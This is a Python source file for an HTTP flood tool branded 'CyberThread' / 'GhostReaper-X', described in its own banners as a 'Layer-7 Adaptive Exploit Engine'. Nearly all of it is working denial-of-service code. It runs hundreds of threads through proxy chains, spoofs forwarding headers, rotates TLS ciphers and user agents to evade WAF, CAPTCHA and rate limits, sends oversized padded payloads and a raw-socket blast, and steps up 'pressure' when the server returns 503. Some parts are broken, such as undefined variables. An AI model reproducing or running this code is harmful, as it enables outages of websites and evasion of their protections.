import http.client
import ssl
import json
import random
import threading
import time
from urllib.parse import urlparse
import socket
import sys
import traceback
import os
import base64
import requests

# ANSI color codes for output
ANSI_RED = "\033[91m"
ANSI_GREEN = "\033[92m"
ANSI_YELLOW = "\033[93m"
ANSI_CYAN = "\033[96m"
ANSI_RESET = "\033[0m"

# Global variables
target = ""
threads = 0
proxy_file = ""
hop_count = 0
payload_type = ""
ua_file = ""
bypass_header = False
tls_spoofing = False
session_cycle = False
exploit_chain = False
delay = 0
flood_method = ""
failover_monitoring = False
proxies = []
user_agents = []
headers = {}
tls_context = ssl.create_default_context()
status_counter = {"200": 0, "403": 0, "503": 0, "other": 0}
semaphore = threading.Semaphore(100)
silent_mode = False
log_file = None
stop_event = threading.Event()
log_file_path = None  # Add this line to define log_file_path

# Load proxies and user agents
def load_list(file):
    if not os.path.exists(file):
        print(f"{ANSI_RED}[ERROR] File not found: {file}{ANSI_RESET}")
        return []
    with open(file, 'r') as f:
        return [x.strip() for x in f if x.strip()]

def load_proxies(file):
    global proxies
    proxies = load_list(file)
    validate_proxies()

def validate_proxies():
    valid_proxies = []
    for proxy in proxies:
        try:
            host, port = proxy.split(":")
            conn = http.client.HTTPSConnection(host, port=int(port), timeout=5)
            conn.request("GET", "/")
            resp = conn.getresponse()
            if resp.status == 200:
                valid_proxies.append(proxy)
        except:
            pass
    proxies[:] = valid_proxies  # Update the global proxies list

def load_user_agents(file):
    global user_agents
    user_agents = load_list(file)

# Inject headers with random chaining
def inject_headers():
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Connection": "keep-alive",
        "User-Agent": generate_user_agent(),
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "id-ID,id;q=0.8", "en-GB,en;q=0.7"])
    }
    if bypass_header:
        headers["X-Originating-IP"] = random.choice(proxies)
        headers["X-Forwarded-Host"] = target
        headers["X-Request-ID"] = str(random.randint(100000, 999999))
        headers["X-Amzn-Trace-Id"] = f"Root=1-{random.randint(10000000,99999999)}"
        headers["X-Forwarded-For"] = random.choice(proxies)
        headers["X-Real-IP"] = random.choice(proxies)
        headers["Via"] = random.choice(proxies)
        headers["Forwarded"] = f"for={random.choice(proxies)};host={target}"
        headers["True-Client-IP"] = random.choice(proxies)
        headers = {k: v.upper() if random.choice([True, False]) else v for k, v in headers.items()}
        headers.update({f"X-Custom-{i}": f"Value{i}" for i in range(random.randint(1, 5))})
    return headers

# Generate dynamic user-agent
def generate_user_agent():
    user_agent_pool = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Linux; Android 10)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(user_agent_pool)

# Mutate payload for various types
def mutate_payload(payload_type):
    if payload_type == "ghost-mutation":
        # Payload chaining and size amplification
        return json.dumps({
            "action": "ghost",
            "random": random.randint(1, 9999),
            "chain": ["A"*random.randint(100, 500) for _ in range(10)],
            "overflow": "X" * random.randint(10000, 30000)
        })
    elif payload_type == "form":
        return "key=value&random=" + str(random.randint(1, 9999))
    elif payload_type == "multipart":
        boundary = "----WebKitFormBoundary" + str(random.randint(1000, 9999))
        data = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="key"\r\n\r\n'
            f"value\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="random"\r\n\r\n'
            f"{random.randint(1, 9999)}\r\n"
            f"--{boundary}--\r\n"
        )
        return data
    else:
        return json.dumps({"error": "unknown payload type"})

# Rotate proxy chain
def rotate_proxy_chain():
    if proxies:
        return random.sample(proxies, k=min(hop_count, len(proxies)))
    return []

# Cycle session (simulate login, action, logout)
def cycle_session():
    try:
        start_time = time.time()
        # Simulate login
        login_payload = {"username": "user", "password": "pass"}
        login_headers = inject_headers()
        host, port = random.choice(proxies).split(":")
        conn = http.client.HTTPSConnection(host, port=int(port), context=tls_context)
        conn.request("POST", "/login", json.dumps(login_payload), login_headers)
        response = conn.getresponse()
        if response.status != 200:
            print(f"Login failed with status code {response.status}")
            return

        # Perform action
        action_payload = mutate_payload(payload_type)
        action_headers = inject_headers()
        conn.request(flood_method.upper(), target, action_payload, action_headers)
        response = conn.getresponse()
        handle_response(response, target, 1, time.time() - start_time)

        # Simulate logout
        logout_headers = inject_headers()
        conn.request("POST", "/logout", "", logout_headers)
        response = conn.getresponse()
        if response.status != 200:
            print(f"Logout failed with status code {response.status}")
    except Exception as e:
        print(f"{ANSI_RED}[ERROR] cycle_session: {traceback.format_exc()}{ANSI_RESET}")

# Handle response and update status counter
def handle_response(response, target, proxy_hop, rtt):
    status_code = response.status
    response_body = response.read().decode('utf-8', errors='ignore')
    status_counter[str(status_code)] = status_counter.get(str(status_code), 0) + 1
    if not silent_mode:
        if 200 <= status_code < 300:
            print(f"{ANSI_GREEN}[200] OK - RTT: {rtt * 1000:.2f}ms - UA: {headers['User-Agent']} - Payload: {payload_type}{ANSI_RESET}")
        elif status_code == 403:
            print(f"{ANSI_RED}[403] Blocked - Rotating Header/TLS{ANSI_RESET}")
            rotate_headers_and_tls()
        elif status_code == 429:
            print(f"{ANSI_YELLOW}[429] Rate Limit - Throttle Mode{ANSI_RESET}")
        elif status_code == 503:
            print(f"{ANSI_YELLOW}[503] Overload - Increasing Pressure{ANSI_RESET}")
        else:
            print(f"{ANSI_RED}[ERROR] Unknown response code {status_code}{ANSI_RESET}")

    analyze_bypass(status_code, response_body)

# Rotate headers and TLS
def rotate_headers_and_tls():
    global headers, tls_context
    headers = inject_headers()
    tls_context = rotate_tls_context()

# Rotate TLS context
def rotate_tls_context():
    ctx = ssl.create_default_context()
    ctx.set_ciphers(random.choice([
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-AES256-GCM-SHA384",
        "TLS_AES_256_GCM_SHA384"
    ]))
    return ctx

# Analyze security bypass
def analyze_bypass(status_code, response_text):
    try:
        if "cpatha" in response_text.lower():
            print(f"{ANSI_RED}[!] CPATHA Detected{ANSI_RESET}")
        else:
            print(f"{ANSI_GREEN}[✓] CPATHA Bypass{ANSI_RESET}")

        if "captcha" in response_text.lower():
            print(f"{ANSI_RED}[!] Captcha Firewall Triggered{ANSI_RESET}")
        else:
            print(f"{ANSI_GREEN}[✓] Captcha Bypass{ANSI_RESET}")

        if "cf-ray" in response_text.lower() or "cloudflare" in response_text.lower():
            print(f"{ANSI_GREEN}[✓] WAF Bypass (Cloudflare){ANSI_RESET}")
        elif "x-waf" in response_text.lower():
            print(f"{ANSI_GREEN}[✓] WAF Bypass (Generic){ANSI_RESET}")
        elif status_code == 403:
            print(f"{ANSI_RED}[!] WAF Blocked{ANSI_RESET}")
        else:
            print(f"{ANSI_GREEN}[✓] WAF Passed{ANSI_RESET}")

        if status_code == 429:
            print(f"{ANSI_RED}[!] Rate-Limit Triggered{ANSI_RESET}")
        else:
            print(f"{ANSI_GREEN}[✓] Rate-Limit Bypass{ANSI_RESET}")

        if "akamai" in response_text.lower() or "fastly" in response_text.lower():
            print(f"{ANSI_CYAN}[✓] CDN Identified & Routed{ANSI_RESET}")
    except Exception as e:
        print(f"{ANSI_RED}[ERROR] analyze_bypass: {traceback.format_exc()}{ANSI_RESET}")

# Monitor target status
def monitor_target():
    while not stop_event.is_set():
        try:
            conn = http.client.HTTPSConnection(parsed_url.netloc, timeout=5)
            conn.request("GET", "/")
            resp = conn.getresponse()
            print(f"[MONITOR] {resp.status}")
        except:
            print("[MONITOR] Target not responding.")
        time.sleep(5)

# Clone target headers
def clone_target_headers():
    conn = http.client.HTTPSConnection(parsed_url.netloc)
    conn.request("GET", "/")
    res = conn.getresponse()
    return dict(res.getheaders())

# Raw socket blast
def raw_socket_blast(ip, port=443):
    context = rotate_tls_context()
    with socket.create_connection((ip, port)) as sock:
        with context.wrap_socket(sock, server_hostname=ip) as ssock:
            for _ in range(3):
                payload = f"POST / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nContent-Length: 10000\r\n\r\n{'A'*10000}"
                ssock.send(payload.encode())

# Launch GhostReaper-X sequence
def launch_ghost_sequence():
    global target, threads, proxy_file, hop_count, payload_type, ua_file, bypass_header, tls_spoofing, session_cycle, exploit_chain, delay, flood_method, failover_monitoring, silent_mode, log_file

    # Hardcoded values for auto-fire mode
    target = "http://example.com"
    threads = 250
    proxy_file = "/tmp/auto_proxy.txt"
    ua_file = "/tmp/ua_fallback.txt"
    hop_count = 3
    payload_type = "ghost-mutation"
    bypass_header = True
    tls_spoofing = True
    session_cycle = True
    exploit_chain = True
    delay = 0.1
    flood_method = "POST"
    failover_monitoring = True
    silent_mode = False
    log_file_path = None  # Ensure log_file_path is defined

    print("\nReady to launch GhostReaper-X Sequence")
    print(f"Target     : {target}")
    print(f"Threads    : {threads}")
    print(f"Proxies    : {proxy_file} ({hop_count} hop)")
    print(f"Payload    : {payload_type}")
    print(f"TLS Finger : { 'Enabled' if tls_spoofing else 'Disabled' }")
    print(f"Header Bypass : { 'Enabled' if bypass_header else 'Disabled' }")
    print(f"Session Cycle : { 'Enabled' if session_cycle else 'Disabled' }")
    print(f"Exploit Chain : { 'Enabled' if exploit_chain else 'Disabled' }")
    print(f"Delay      : {delay}s")
    print(f"Flood Method: {flood_method}")
    print(f"Failover Monitoring : { 'Enabled' if failover_monitoring else 'Disabled' }")
    print(f"Silent Mode : { 'Enabled' if silent_mode else 'Disabled' }")
    print(f"Log File   : {log_file_path if log_file_path else 'None'}")

    input("[Enter] to begin sequence...\n")

    load_proxies(proxy_file)
    load_user_agents(ua_file)

    # Run recon after target is set
    print(f"[✓] Running recon on {target} ...")
    recon_target(target)

    def worker():
        local_headers = inject_headers()
        tls_context = rotate_tls_context()
        while not stop_event.is_set():
            try:
                semaphore.acquire()
                proxy_chain = rotate_proxy_chain()
                for proxy in proxy_chain:
                    host, port = proxy.split(":")
                    parsed_url = urlparse(target)
                    conn = http.client.HTTPSConnection(host, port=int(port), context=tls_context)
                    local_headers['User-Agent'] = generate_user_agent()
                    target_path = parsed_url.path + f"?inject={random.randint(1, 1000)}"
                    local_headers[f"X-Chain-{random.randint(1, 5)}"] = "Exploit" + str(random.randint(1000, 9999))
                    payload_data = mutate_payload(payload_type)
                    conn.request(flood_method.upper(), target_path, payload_data, local_headers)
                    start_time = time.time()
                    response = conn.getresponse()
                    rtt = time.time() - start_time
                    handle_response(response, target, proxy_chain.index(proxy) + 1, rtt)
                    if session_cycle:
                        cycle_session()
                    if failover_monitoring and response.status in [403, 429, 503]:
                        time.sleep(delay + random.uniform(0.2, 1.0))
            except Exception as e:
                if log_file:
                    log_file.write(f"{ANSI_RED}[ERROR] worker: {traceback.format_exc()}{ANSI_RESET}\n")
                else:
                    print(f"{ANSI_RED}[ERROR] worker: {traceback.format_exc()}{ANSI_RESET}")
            finally:
                semaphore.release()
                time.sleep(delay + random.uniform(0.1, 0.5))

    thread_pool = []
    for _ in range(threads):
        thread = threading.Thread(target=worker)
        thread.start()
        thread_pool.append(thread)

    # Start real-time status display
    threading.Thread(target=print_status).start()

    if failover_monitoring:
        threading.Thread(target=monitor_target).start()

    for thread in thread_pool:
        thread.join()

    print("GhostReaper-X sequence terminated.")

def print_status():
    last_state = {"200": -1, "403": -1, "503": -1}
    while not stop_event.is_set():
        if (status_counter["200"] != last_state["200"] or
            status_counter["403"] != last_state["403"] or
            status_counter["503"] != last_state["503"]):
            print(f"✅ 200: {status_counter['200']} | 🔒 403: {status_counter['403']} | ⚠️ 503: {status_counter['503']}")
            sys.stdout.flush()
            last_state.update(status_counter)
        time.sleep(1)

# Additional functions for enhanced capabilities

def obfuscate(data):
    data = data.replace("script", "scr\"ipt")
    data = data.replace("admin", "a"+"dmin")
    return data

def fetch_proxies_online():
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    r = requests.get(url)
    return r.text.splitlines()

def encode_payload(data):
    return base64.b64encode(data.encode()).decode()

def build_payload_chain():
    chain = []
    for _ in range(10):
        payload = mutate_payload("ghost-mutation")
        payload = encode_payload(payload)
        chain.append(payload)
    return chain

def save_payload_chain(file_path, chain):
    with open(file_path, 'w') as f:
        for payload in chain:
            f.write(f"{payload}\n")

def load_payload_chain(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f]

def recon_target(target):
    try:
        parsed = urlparse(target)
        conn = http.client.HTTPSConnection(parsed.hostname, context=ssl.create_default_context())
        conn.request("GET", "/")
        res = conn.getresponse()
        headers = dict(res.getheaders())
        if "Server" in headers:
            print(f"[+] Server fingerprint: {headers['Server']}")
        if "cf-ray" in headers:
            print("[+] Cloudflare WAF detected")
    except Exception as e:
        print(f"[!] Recon failed: {e}")

# Banner functions
def print_banner_brutal():
    print("""
╔══════════════════════════════════════╗
║   ☠ CYBERTHREAD ☠                   ║
║   Layer-7 Adaptive Exploit Engine   ║
║   Status : LIVE | Threads : █████   ║
║   Target : WAF-Hardened / CDN-Edge  ║
╚══════════════════════════════════════╝
     ↳ Payload Mutation : ENABLED
     ↳ TLS Fingerprint : SPOOFED
     ↳ Header Chain    : RANDOMIZED
     ↳ Session Cycle   : SIMULATED
     ↳ Response Map    : [200✓] [403✗] [503⚠]
    """)

def print_banner_stealth():
    print("""
╭────────────────────────────────────────────╮
│  CYBERTHREAD Recon Module [Stealth Mode]  │
│  Target       : x.x.x.x / domain.com       │
│  Proxy Hop    : Randomized + Obfuscated    │
│  UA Pool      : 1000+ Real Signatures      │
│  Header Mask  : CPATHA / Cloudflare Bypass │
╰────────────────────────────────────────────╯
   [+] Initial Fingerprint     : OK
   [+] CDN Detection           : ✓ Cloudflare
   [+] Firewall Signatures     : ✓ Detected
    """)

def print_banner_mini():
    print("""
[ CYBERTHREAD ] ⚔  L7 Exploit Injector
↳ Stealth Mode : ENABLED
↳ Mutation     : Ghost Payload
↳ Threads      : █████ Brutal
    """)

# Main function to start the attack
if __name__ == "__main__":
    print_banner_mini()
    launch_ghost_sequence()